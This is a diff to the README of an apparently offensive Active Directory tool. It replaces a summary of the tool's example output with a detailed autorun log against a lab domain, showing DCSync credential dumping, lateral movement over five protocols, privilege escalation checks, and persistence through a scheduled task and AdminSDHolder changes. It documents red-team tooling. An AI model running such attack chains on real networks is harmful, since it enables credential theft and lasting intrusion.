@@ -75,36 +75,83 @@ adpack run lateral -t 10.0.0.6         # Lateral movement
 <summary>⚪ View Example Output</summary>
 
 ```
-  State
-───────
-
-╭────────────────────────────────────────────────────────────╮
-│   Hosts        3 discovered (1 DC)                         │
-│   Users        56 enumerated                               │
-│   Credentials  12 acquired (8 validated)                   │
-│   Sessions     4 active                                    │
-│   BloodHound   ingested (2 DA users)                       │
-╰────────────────────────────────────────────────────────────╯
-
-  → Next:  session_harvest
-    Why:   Validated creds but no sessions. Hunt via NetExec.
-
-Full autorun chain:
+  ────────────────────────────────────────────────────
+  AUTO-RUN  ·  Automated Attack Chain
+  Target:   192.168.57.10
+  Limit:    9 phases
+  ────────────────────────────────────────────────────
 
   → Seeded creds: sevenkingdoms.local\Administrator
 
-  [1] DISCOVERY        1 host(s) discovered             16ms
-  [2] ENUMERATION      15 user(s) enumerated             1.6s
-  [3] CREDENTIAL_ACQ   17 creds (secretsdump fallback)   1.3s
-  [4] SESSION_HARVEST  0 sessions                        1.0s
-  [5] GRAPH_ANALYSIS   1 computer, 5 ADCS templates      2.7s
-  [6] LATERAL          All 5 protocols succeeded          48s
-  [7] VALIDATION       17/18 valid (3 admin)              47s
-  [8] PRIVESC          GPP · ACL · ADCS · RBCD           2.9s
-  [9] PERSISTENCE      schtasks · AdminSDHolder           23s
+  [1] DISCOVERY
+      [+] Host added from target flag: 192.168.57.10
+      ✓  1 host(s) discovered
+      ✓ complete  ·  15ms
 
-────────────────────────────────────────────────────
-■  9 phases executed  ·  1 hosts  ·  15 users  ·  18 creds (17 validated)
+  [2] ENUMERATION
+      [*] Enumerating users on 192.168.57.10 (sevenkingdoms.local)...
+      [+] Enumerated 15 users
+      ✓  15 user(s) enumerated
+      ✓ complete  ·  1.1s
+
+  [3] CREDENTIAL_ACQ
+      → Kerberos pre-check...
+      AS-REP: 0 roastable  ·  Kerberoast: 1 SPN found
+      [*] Primary pipeline failed, trying DCSync via impacket-secretsdump...
+      [*] DCSync via impacket-secretsdump against 192.168.57.10...
+      [+] Secretsdump: 17 credentials found
+      ✓  17 credential(s) acquired
+      ✓ complete  ·  1.3s
+
+  [4] SESSION_HARVEST
+      [*] Harvesting sessions on 192.168.57.10...
+      [+] Harvested 0 sessions
+      ✓ complete  ·  1.0s
+
+  [5] GRAPH_ANALYSIS
+      1 computer(s), 0 GPO(s), 5 ADCS template(s)
+      ✓ complete  ·  2.7s
+
+  [6] LATERAL
+      [*] Trying SMB on 192.168.57.10...
+      ✓ SMB succeeded
+      [*] Trying PSExec on 192.168.57.10...
+      ✓ PSExec succeeded
+      [*] Trying Schtasks on 192.168.57.10...
+      ✓ Schtasks succeeded
+      [*] Trying WMI on 192.168.57.10...
+      ✓ WMI succeeded
+      [*] Trying WinRM on 192.168.57.10...
+      ✓ WinRM succeeded
+      ✓ complete  ·  48s
+
+  [7] VALIDATION
+      [*] Validating 18 credentials against 1 hosts...
+      [2/18] Validating sevenkingdoms.local\Administrator
+      [+] Valid on: SMB, LDAP, WinRM [ADMIN]
+      ...
+      [+] Validation complete: 17/18 valid (3 admin)
+      ✓ complete  ·  47s
+
+  [8] PRIVESC
+      [*] Checking GPP passwords in SYSVOL...
+      [*] Checking ACL abuse paths...
+      [*] Checking ADCS vulnerable templates...
+      [+] ADCS: Found SEVENKINGDOMS-CA
+      [*] Checking RBCD...
+      ✓ Privesc checks completed
+      ✓ complete  ·  2.9s
+
+  [9] PERSISTENCE
+      [*] Creating scheduled task persistence...
+      [+] Scheduled task created
+      [*] Attempting AdminSDHolder modification...
+      [+] AdminSDHolder modified
+      ✓ Persistence mechanisms deployed
+      ✓ complete  ·  23s
+
+  ────────────────────────────────────────────────────
+  ■  9 phases executed  ·  1 hosts  ·  15 users  ·  18 creds (17 validated)
 ```
 
 </details>
